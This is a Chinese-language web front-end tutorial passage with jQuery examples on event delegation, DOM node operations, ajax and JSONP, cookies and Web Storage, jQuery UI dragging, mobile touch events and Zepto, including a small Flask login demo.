&lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* // 这个写法相当于绑定8次，比较损耗性能 $('.list li').click(function()&#123; $(this).css(&#123;'backgroundColor':'red'&#125;); &#125;); */ // 新建一个li元素赋值给$li变量 //var $li = $('&lt;li&gt;9&lt;/li&gt;'); //让新加的li有相同的事件，需要单独绑定 //$li.click(....) // 把新建的li元素放到ul子集的最后面 //$('.list').append($li); //事件委托，将li要发生的事件委托给li的父级 $('.list').delegate('li', 'click', function () &#123; //$(this) 指的是委托的子元素 $(this).css(&#123;'backgroundColor': 'red'&#125;); &#125;); var $li = $('&lt;li&gt;9&lt;/li&gt;'); $('.list').append($li); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .list &#123; background-color: gold; list-style: none; padding: 10px; &#125; .list li &#123; height: 30px; background-color: green; margin: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt; &lt;li&gt;8&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;15.jquery元素节点操作15.1 创建节点12var $div = $('&lt;div&gt;');var $div2 = $('&lt;div&gt;这是一个div元素&lt;/div&gt;');15.2 插入节点1、append()和appendTo()：在现存元素的内部，从后面插入元素1234var $span = $('&lt;span&gt;这是一个span元素&lt;/span&gt;');$('#div1').append($span);......&lt;div id="div1"&gt;&lt;/div&gt;2、prepend()和prependTo()：在现存元素的内部，从前面插入元素3、after()和insertAfter()：在现存元素的外部，从后面插入元素，也就是在现存元素的父级元素后面插入新元素4、before()和insertBefore()：在现存元素的外部，从前面插入元素，也就是在现存元素的父级元素前面插入新元素注意：对已有的节点进行上述操作的话是剪切再粘贴。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; // 新增节点操作 // 通过html的字符串的方式添加节点性能最高 // 如下的这种方式会替换掉原来的 //$('#div1').html('&lt;a href="#"&gt;链接&lt;/a&gt;') // 先获取到原来的，然后使用+拼接起来 //$('#div1').html($('#div1').html()+'&lt;a href="#"&gt;链接&lt;/a&gt;') // 新建一个带有属性的a元素，把它赋值给$a $a = $('&lt;a href="#"&gt;链接&lt;/a&gt;'); // 父元素内的后面放入子元素 // $('#div1').append($a); //子元素放入到父元素内部的后面 $a.appendTo($('#div1')); // 实际结果跟$('#div1').append($a);一样 // 新建一个空的a元素 $a2 = $('&lt;a&gt;'); $('#div1').append($a2); // 实际效果：&lt;a&gt;&lt;/a&gt; $p = $('&lt;p&gt;这是一个p元素&lt;/p&gt;'); // 父元素内的前面放入子元素 //$('#div1').prepend($p); //子元素放入到父元素内部的前面 $p.prependTo($('#div1')); $h2 = $('&lt;h2&gt;这是一个h2&lt;/h2&gt;'); //$('#div1').after($h2); $h2.insertAfter($('#div1')); $h3 = $('&lt;h3&gt;这是一个h3&lt;/h3&gt;'); //$('#div1').before($h3); $h3.insertBefore($('#div1')); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="div1"&gt; &lt;h1&gt;这是一个H1元素&lt;/h1&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;15.3 删除节点1$(&apos;#div1&apos;).remove();15.4 课堂练习todolist(计划列表)实例12345678&lt;!-- a标签的href属性 --&gt;&lt;!-- # 默认会链接到页面顶部 --&gt;&lt;a href="#"&gt;链接&lt;/a&gt;&lt;a href="javascript:alert('ok!');"&gt;链接&lt;/a&gt;&lt;!-- 让链接的默认行为是 执行javascript的空语句，也就是什么都不做 --&gt;&lt;a href="javascript:;"&gt;链接&lt;/a&gt;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;todolist&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $inputtxt = $('#txt1'); var $btn = $('#btn1'); var $ul = $('#list'); $btn.click(function () &#123; // 获取input输入框的内容 var $val = $inputtxt.val(); if ($val == "") &#123; alert('请输入内容'); return; &#125; var $li = $('&lt;li&gt;&lt;span&gt;' + $val + '&lt;/span&gt;&lt;a href="javascript:;" class="up"&gt; ↑ &lt;/a&gt;&lt;a href="javascript:;" class="down"&gt; ↓ &lt;/a&gt;&lt;a href="javascript:;" class="del"&gt;删除&lt;/a&gt;&lt;/li&gt;'); /* var $a = $li.find('.del'); $a.click(function()&#123; $(this).parent().remove(); &#125;) */ $ul.append($li); $inputtxt.val(""); &#125;); /* $('.del').click(function()&#123; $(this).parent().remove(); &#125;) */ $ul.delegate('a', 'click', function () &#123; var $handler = $(this).prop('class'); if ($handler == 'del') &#123; $(this).parent().remove(); &#125; if ($handler == 'up') &#123; if ($(this).parent().prev().length == 0) &#123; alert('到顶了！'); return; &#125; $(this).parent().insertBefore($(this).parent().prev()); &#125; if ($handler == 'down') &#123; if ($(this).parent().next().length == 0) &#123; alert('到底了！'); return; &#125; $(this).parent().insertAfter($(this).parent().next()); &#125; &#125;); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .list_con &#123; width: 600px; margin: 50px auto 0; &#125; .inputtxt &#123; width: 550px; height: 30px; border: 1px solid #ccc; padding: 0px; text-indent: 10px; &#125; .inputbtn &#123; width: 40px; height: 32px; padding: 0px; border: 1px solid #ccc; &#125; .list &#123; margin: 0; padding: 0; list-style: none; margin-top: 20px; &#125; .list li &#123; height: 40px; line-height: 40px; border-bottom: 1px solid #ccc; &#125; .list li span &#123; float: left; &#125; .list li a &#123; float: right; text-decoration: none; margin: 0 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="list_con"&gt; &lt;h2&gt;To do list&lt;/h2&gt; &lt;input type="text" name="" id="txt1" class="inputtxt"&gt; &lt;input type="button" name="" value="增加" id="btn1" class="inputbtn"&gt; &lt;ul id="list" class="list"&gt; &lt;li&gt;&lt;span&gt;学习html&lt;/span&gt;&lt;a href="javascript:;" class="up"&gt; ↑ &lt;/a&gt;&lt;a href="javascript:;" class="down"&gt; ↓ &lt;/a&gt;&lt;a href="javascript:;" class="del"&gt;删除&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;学习css&lt;/span&gt;&lt;a href="javascript:;" class="up"&gt; ↑ &lt;/a&gt;&lt;a href="javascript:;" class="down"&gt; ↓ &lt;/a&gt;&lt;a href="javascript:;" class="del"&gt;删除&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;学习javascript&lt;/span&gt;&lt;a href="javascript:;" class="up"&gt; ↑ &lt;/a&gt;&lt;a href="javascript:;" class="down"&gt; ↓ &lt;/a&gt;&lt;a href="javascript:;" class="del"&gt;删除&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;16. 滚轮事件与函数节流16.1 jquery.mousewheel插件使用jquery中没有鼠标滚轮事件，原生js中的鼠标滚轮事件不兼容，可以使用jquery的滚轮事件插件jquery.mousewheel.js。16.2 函数节流javascript中有些事件的触发频率非常高，比如onresize事件(jq中是resize)，onmousemove事件(jq中是mousemove)以及上面说的鼠标滚轮事件，在短事件内多处触发执行绑定的函数，可以巧妙地使用定时器来减少触发的次数，实现函数节流。16.3 课堂实例16.3.1 整屏滚动123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;整页滚动&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="css/test.css"&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/jquery.mousewheel.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $screen = $('.pages_con'); var $pages = $('.pages'); var $len = $pages.length; var $h = $(window).height(); var $points = $('.points li'); var timer = null; var $nowscreen = 0; $pages.css(&#123;'height': $h&#125;); $pages.eq(0).addClass('moving'); $points.click(function () &#123; $nowscreen = $(this).index(); $points.eq($nowscreen).addClass('active').siblings().removeClass('active'); $screen.animate(&#123;'top': -$h * $nowscreen&#125;, 300); $pages.eq($nowscreen).addClass('moving').siblings().removeClass('moving'); &#125;); $(window).mousewheel(function (event, dat) &#123; clearTimeout(timer); timer = setTimeout(function () &#123; if (dat == -1) &#123; $nowscreen++; &#125; else &#123; $nowscreen--; &#125; if ($nowscreen &lt; 0) &#123; $nowscreen = 0; &#125; if ($nowscreen &gt; $len - 1) &#123; $nowscreen = $len - 1; &#125; $screen.animate(&#123;'top': -$h * $nowscreen&#125;, 300); $pages.eq($nowscreen).addClass('moving').siblings().removeClass('moving'); $points.eq($nowscreen).addClass('active').siblings().removeClass('active'); &#125;, 200) &#125;) &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="pages_con"&gt; &lt;div class="pages page1"&gt; &lt;div class="main_con"&gt; &lt;div class="left_img"&gt;&lt;img src="images/001.png"&gt;&lt;/div&gt; &lt;div class="right_info"&gt; Web前端开发是从网页制作演变而来的，名称上有很明显的时代特征。在互联网的演化进程中，网页制作是Web1.0时代的产物，那时网站的主要内容都是静态的，用户使用网站的行为也以浏览为主。 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="pages page2"&gt; &lt;div class="main_con"&gt; &lt;div class="right_img"&gt;&lt;img src="images/002.png"&gt;&lt;/div&gt; &lt;div class="left_info"&gt; 2005年以后，互联网进入Web2.0时代，各种类似桌面软件的Web应用大量涌现，网站的前端由此发生了翻天覆地的变化。网页不再只是承载单一的文字和图片，各种富媒体让网页的内容更加生动，网页上软件化的交互形式为用户提供了更好的使用体验，这些都是基于前端技术实现的。 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="pages page3"&gt; &lt;div class="main_con"&gt; &lt;div class="left_img"&gt;&lt;img src="images/004.png"&gt;&lt;/div&gt; &lt;div class="right_info"&gt; 以前会Photoshop和Dreamweaver就可以制作网页，现在只掌握这些已经远远不够了。无论是开发难度上，还是开发方式上，现在的网页制作都更接近传统的网站后台开发，所以现在不再叫网页制作，而是叫Web前端开发。 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="pages page4"&gt; &lt;div class="main_con"&gt; &lt;div class="left_img"&gt;&lt;img src="images/003.png"&gt;&lt;/div&gt; &lt;div class="right_info"&gt; Web前端开发在产品开发环节中的作用变得越来越重要，而且需要专业的前端工程师才能做好，这方面的专业人才近几年来备受青睐。Web前端开发是一项很特殊的工作，涵盖的知识面非常广，既有具体的技术，又有抽象的理念。简单地说，它的主要职能就是把网站的界面更好地呈现给用户。 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="pages page5"&gt; &lt;div class="main_con"&gt; &lt;div class="center_img"&gt;&lt;img src="images/005.png"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;ul class="points"&gt; &lt;li class="active"&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;16.3.2 幻灯片16.3.3 制作CSS3动画1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.12.4.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; $('#btn').click(function()&#123; $('.box').addClass('moving'); &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .box&#123; width:200px; height:200px; background-color:gold; margin:50px auto 0; transition:all 1s ease; &#125; .moving&#123; transform:rotate(135deg); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;input type="button" name="" value="动画" id="btn"&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;17. jsonjson是 JavaScript Object Notation 的首字母缩写，单词的意思是javascript对象表示法，这里说的json指的是类似于javascript对象的一种数据格式，目前这种数据格式比较流行，逐渐替换掉了传统的xml数据格式。17.1 javascript自定义对象1234567var oMan = &#123; name:'tom', age:16, talk:function(s)&#123; alert('我会说'+s); &#125;&#125;17.2 json格式的数据1234&#123; "name":"tom", "age":18&#125;与json对象不同的是，json数据格式的属性名称和字符串值需要用双引号引起来，用单引号或者不用引号会导致读取数据错误。json的另外一个数据格式是数组，和javascript中的数组字面量相同。1[&quot;tom&quot;,18,&quot;programmer&quot;]18. ajax与jsonpajax技术的目的是让javascript发送http请求，与后台通信，获取数据和信息。ajax技术的原理是实例化xmlhttp对象，使用此对象与后台通信。ajax通信的过程不会影响后续javascript的执行，从而实现异步。同步和异步现实生活中，同步指的是同时做几件事情，异步指的是做完一件事后再做另外一件事，程序中的同步和异步是把现实生活中的概念对调，也就是程序中的异步指的是现实生活中的同步，程序中的同步指的是现实生活中的异步。局部刷新和无刷新ajax可以实现局部刷新，也叫做无刷新，无刷新指的是整个页面不刷新，只是局部刷新，ajax可以自己发送http请求，不用通过浏览器的地址栏，所以页面整体不会刷新，ajax获取到后台数据，更新页面显示数据的部分，就做到了页面局部刷新。同源策略ajax请求的页面或资源只能是同一个域下面的资源，不能是其他域的资源，这是在设计ajax时基于安全的考虑。特征报错提示：123XMLHttpRequest cannot load https://www.baidu.com/. No &apos;Access-Control-Allow-Origin&apos; header is present on the requested resource. Origin &apos;null&apos; is therefore not allowed access.18.1 $.ajax使用方法常用参数：1、url 请求地址2、type 请求方式，默认是’GET’，常用的还有’POST’3、dataType 设置返回的数据格式，常用的是’json’格式，也可以设置为’html’4、data 设置发送给服务器的数据5、success 设置请求成功后的回调函数6、error 设置请求失败后的回调函数7、async 设置是否异步，默认值是’true’，表示异步以前的写法：123456789101112$.ajax(&#123; url: &apos;js/data.json&apos;, type: &apos;GET&apos;, dataType: &apos;json&apos;, data:&#123;&apos;aa&apos;:1&#125; success:function(data)&#123; alert(data.name); &#125;, error:function()&#123; alert(&apos;服务器超时，请重试！&apos;); &#125;&#125;);新的写法(推荐)：1234567891011121314$.ajax(&#123; url: &apos;js/data.json&apos;, type: &apos;GET&apos;, dataType: &apos;json&apos;, data:&#123;&apos;aa&apos;:1&#125;&#125;).done(function(data) &#123; alert(data.name);&#125;).fail(function() &#123; alert(&apos;服务器超时，请重试！&apos;);&#125;);// data.json里面的数据： &#123;&quot;name&quot;:&quot;tom&quot;,&quot;age&quot;:18&#125;课堂练习制作首页用户信息读取12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python#-*- coding: utf-8 -*-from flask import Flask,render_template,request,jsonifyapp = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/login',methods=['GET','POST'])def login(): if request.method == 'GET': return render_template('login.html') else: # 和前端约定好，发送网络请求，不管用户名和密码是否验证成功 # 我都返回同样格式的json对象给你 # &#123;"code":200,"message":""&#125; username = request.form.get('username') password = request.form.get('password') print(username,password) data = &#123; 'username':username &#125; if username == '111' and password == '222': return jsonify(&#123;"code":200,"message":"","data":data&#125;) else: return jsonify(&#123;"code":401,"message":"用户名或密码错误！"&#125;)if __name__ == '__main__': app.run(debug=True)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// index.html&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Index&lt;/title&gt; &lt;script type="text/javascript" src="static/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $("#btn").click(function () &#123; var $username = $("#username").val(); var $password = $("#password").val(); var $data = &#123; "username": $username, "password": $password &#125;; $.ajax(&#123; url: "/login", type: 'POST', dataType: 'json', data: $data, &#125;) .done(function (data) &#123; if (data['code'] == 200) &#123; $("#div01").hide(); $(".div2").append(data['data']['username']); $(".div2").removeClass("div2"); &#125; &#125;) &#125;); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .div2&#123; display: none; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;Index&lt;/h2&gt; &lt;div id="div01"&gt; &lt;p&gt; &lt;span&gt;用户名：&lt;/span&gt; &lt;input type="text" name="username" id="username"&gt; &lt;/p&gt; &lt;p&gt; &lt;span&gt;密码：&lt;/span&gt; &lt;input type="password" name="pwd" id="password"&gt; &lt;/p&gt; &lt;button id="btn" value="submit"&gt;提交&lt;/button&gt; &lt;/div&gt; &lt;div class="div2"&gt; &lt;span&gt;用户名：&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;18.2 jsonpajax只能请求同一个域下的数据或资源，有时候需要跨域请求数据，就需要用到jsonp技术，jsonp可以跨域请求数据，它的原理主要是利用了&lt;script&gt;标签可以跨域链接资源的特性。jsonp和ajax原理完全不一样，不过jquery将它们封装成同一个函数。1234567891011121314$.ajax(&#123; url:'js/data.js', type:'get', dataType:'jsonp', jsonpCallback:'fnBack'&#125;).done(function(data)&#123; alert(data.name);&#125;).fail(function() &#123; alert('服务器超时，请重试！');&#125;);// data.js里面的数据： fnBack(&#123;"name":"tom","age":18&#125;);课堂实例获取360搜索关键词联想数据12345678910111213141516171819202122232425$(function()&#123; $(&apos;#txt01&apos;).keyup(function()&#123; var sVal = $(this).val(); $.ajax(&#123; url:&apos;https://sug.so.360.cn/suggest?&apos;, type:&apos;get&apos;, dataType:&apos;jsonp&apos;, data: &#123;word: sVal&#125; &#125;) .done(function(data)&#123; var aData = data.s; $(&apos;.list&apos;).empty(); for(var i=0;i&lt;aData.length;i++) &#123; var $li = $(&apos;&lt;li&gt;&apos;+ aData[i] +&apos;&lt;/li&gt;&apos;); $li.appendTo($(&apos;.list&apos;)); &#125; &#125;) &#125;)&#125;)//......&lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;txt01&quot;&gt;&lt;ul class=&quot;list&quot;&gt;&lt;/ul&gt;19. 本地存储本地存储分为cookie，以及新增的localStorage和sessionStorage1、cookie 存储在本地，容量最大4k，在同源的http请求时携带传递，损耗带宽，可设置访问路径，只有此路径及此路径的子路径才能访问此cookie，在设置的过期时间之前有效。1234// jquery 设置cookie$.cookie('mycookie','123',&#123;expires:7,path:'/'&#125;);// jquery 获取cookie$.cookie('mycookie');123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/jquery.cookie.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 设置cookie 过期时间为7天，存在网站根目录下 //$.cookie('mycookie','ok!',&#123;expires:7,path:'/'&#125;); //读取cookie var mycookie = $.cookie('mycookie'); alert(mycookie); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;测试页面&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;课堂实例只提示一次的弹框123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/jquery.cookie.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var hasread = $.cookie('hasread'); //alert(hasread); // 判断是否存了cookie，没有就弹出弹框 if (hasread == undefined) &#123; $('.pop_con').show(); &#125; //用户点击知道后，存cookie，把弹框关掉 $('#user_read').click(function () &#123; $.cookie('hasread', 'read', &#123;expires: 7, path: '/'&#125;); $('.pop_con').hide(); &#125;) &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .pop_con &#123; display: none; &#125; .pop &#123; position: fixed; width: 500px; height: 300px; background-color: #fff; border: 3px solid #000; left: 50%; top: 50%; margin-left: -250px; margin-top: -150px; z-index: 9999; &#125; .mask &#123; position: fixed; width: 100%; height: 100%; background-color: #000; opacity: 0.3; filter: alpha(opacity=30); left: 0; top: 0; z-index: 9990; &#125; .close &#123; float: right; font-size: 30px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="pop_con"&gt; &lt;div class="pop"&gt; 亲！本网站最近有优惠活动！请强力关注！ &lt;a href="#" id="close" class="close"&gt;×&lt;/a&gt; &lt;a href="javascript:;" id="user_read"&gt;朕知道了！&lt;/a&gt; &lt;/div&gt; &lt;div class="mask"&gt;&lt;/div&gt;&lt;/div&gt;&lt;h1&gt;网站内容&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;2、localStorage 存储在本地，容量为5M或者更大，不会在请求时候携带传递，在所有同源窗口中共享，数据一直有效，除非人为删除，可作为长期数据。12345678910//设置：localStorage.setItem(&quot;dat&quot;, &quot;456&quot;);localStorage.dat = &apos;456&apos;;//获取：localStorage.getItem(&quot;dat&quot;);localStorage.dat//删除localStorage.removeItem(&quot;dat&quot;);3、sessionStorage 存储在本地，容量为5M或者更大，不会在请求时候携带传递，在同源的当前窗口关闭前有效。localStorage 和 sessionStorage 合称为Web Storage , Web Storage支持事件通知机制，可以将数据更新的通知监听者，Web Storage的api接口使用更方便。iPhone的无痕浏览不支持Web Storage，只能用cookie。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript"&gt; // 不用加载jQuery文件 //设置： localStorage.setItem("dat", "456"); localStorage.dat = '456'; //获取： localStorage.getItem("dat"); localStorage.dat //删除 localStorage.removeItem("dat"); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;测试webstorage&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;20. jqueryUIjQuery UI是以 jQuery 为基础的代码库。包含底层用户交互、动画、特效和可更换主题的可视控件。我们可以直接用它来构建具有很好交互性的web应用程序。jqueryUI 网址http://jqueryui.com/课堂实例1、设置数值的滑动条1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;drag&lt;/title&gt; &lt;script type="text/javascript" src="jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/jquery-ui.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('.dragbar').draggable(&#123; // 限制在X轴方向拖动 axis: 'x', // 限定在父级的范围内拖动 containment: 'parent', //containment:[0,0,600,0] //设置拖动时候的透明度 opacity: 0.6, drag: function (ev, ui) &#123; //console.log(ui.position.left); //获取拖动的距离 var nowleft = ui.position.left; $('.progress').css(&#123;width: nowleft&#125;); $('.slide_count').val(parseInt(nowleft * 100 / 570)); &#125; &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .slidebar_con &#123; width: 650px; height: 32px; margin: 50px auto 0; &#125; .slidebar &#123; width: 600px; height: 30px; border: 1px solid #ccc; float: left; position: relative; &#125; .slidebar .dragbar &#123; width: 30px; height: 30px; background-color: gold; cursor: pointer; position: absolute; left: 0; top: 0; &#125; .slidebar .progress &#123; width: 0px; height: 30px; background-color: #f0f0f0; position: absolute; left: 0; top: 0; &#125; .slide_count &#123; padding: 0; float: right; width: 40px; height: 30px; border: 1px solid #ccc; text-align: center; font-size: 16px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="slidebar_con"&gt; &lt;div class="slidebar"&gt; &lt;div class="progress"&gt;&lt;/div&gt; &lt;div class="dragbar"&gt;&lt;/div&gt; &lt;/div&gt; &lt;input type="text" name="" value="0" class="slide_count"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;2 、自定义滚动条1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;自定义滚动条&lt;/title&gt; &lt;script type="text/javascript" src="jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/jquery-ui.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var h = $('.paragraph').outerHeight(); //整体文本的高度减去外面容器的高度 var hide = h - 500; $('.scroll_bar').draggable(&#123; axis: 'y', containment: 'parent', opacity: 0.6, drag: function (ev, ui) &#123; var nowtop = ui.position.top; var nowscroll = parseInt(nowtop / 290 * hide); $('.paragraph').css(&#123;top: -nowscroll&#125;); &#125; &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .scroll_con &#123; width: 400px; height: 500px; border: 1px solid #ccc; margin: 50px auto 0; position: relative; overflow: hidden; &#125; .paragraph &#123; width: 360px; position: absolute; left: 0; top: 0; padding: 10px 20px; font-size: 14px; font-family: 'Microsoft Yahei'; line-height: 32px; text-indent: 2em; &#125; .scroll_bar_con &#123; width: 10px; height: 490px; position: absolute; right: 5px; top: 5px; &#125; .scroll_bar &#123; width: 10px; height: 200px; background-color: #ccc; position: absolute; left: 0; top: 0; cursor: pointer; border-radius: 5px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="scroll_con"&gt; &lt;div class="paragraph"&gt; 掌握HTML是网页的核心，是一种制作万维网页面的标准语言，是万维网浏览器使用的一种语言，它消除了不同计算机之间信息交流的障碍。因此，它是目前网络上应用最为广泛的语言，也是构成网页文档的主要语言，学好HTML是成为Web开发人员的基本条件。 学好CSS是网页外观的重要一点，CSS可以帮助把网页外观做得更加美观。 学习JavaScript的基本语法，以及如何使用JavaScript编程将会提高开发人员的个人技能。 了解Unix和Linux的基本知识虽然这两点很基础，但是开发人员了解Unix和Linux的基本知识是有益无害的。 了解Web服务器当你对Apache的基本配置，htaccess配置技巧有一些掌握的话，将来必定受益，而且这方面的知识学起来也相对容易。 &lt;/div&gt; &lt;div class="scroll_bar_con"&gt; &lt;div class="scroll_bar"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3、 拖拽12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/jquery-ui.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; $('.box').draggable(&#123; // 限制在x轴向拖动 //axis:'x', // 限定在父级的范围内拖动 containment:'parent', drag:function(ev,ui)&#123; //console.log(ui); //document.title = ui.position.left; $('#shownumber').val(parseInt(100*(ui.position.left/600))) &#125; &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .con&#123; width:800px; height:200px; border:1px solid #000; margin:50px auto 0; &#125; .box&#123; width:200px; height:200px; background-color: gold; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="con"&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;/div&gt; &lt;input type="text" name="" id="shownumber"&gt;&lt;/body&gt;&lt;/html&gt;21. 移动端js事件移动端的操作方式和PC端是不同的，移动端主要用手指操作，所以有特殊的touch事件，touch事件包括如下几个事件：1、touchstart: //手指放到屏幕上时触发2、touchmove: //手指在屏幕上滑动式触发3、touchend: //手指离开屏幕时触发4、touchcancel: //系统取消touch事件的时候触发，比较少用移动端一般有三种操作，点击、滑动、拖动，这三种操作一般是组合使用上面的几个事件来完成的，所有上面的4个事件一般很少单独使用，一般是封装使用来实现这三种操作，可以使用封装成熟的js库。22. zeptojsZepto是一个轻量级的针对现代高级浏览器的JavaScript库， 它与jquery有着类似的api。 如果你会用jquery，那么你也会用zepto。Zepto的一些可选功能是专门针对移动端浏览器的；它的最初目标是在移动端提供一个精简的类似jquery的js库。zepto官网：http://zeptojs.com/zepto中文api：http://www.css88.com/doc/zeptojs_api/zepto包含很多模块，默认下载版本包含的模块有Core, Ajax, Event, Form, IE模块，如果还需要其他的模块，可以自定义构建。zepto自定义构建地址：http://github.e-sites.nl/zeptobuilder/12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; 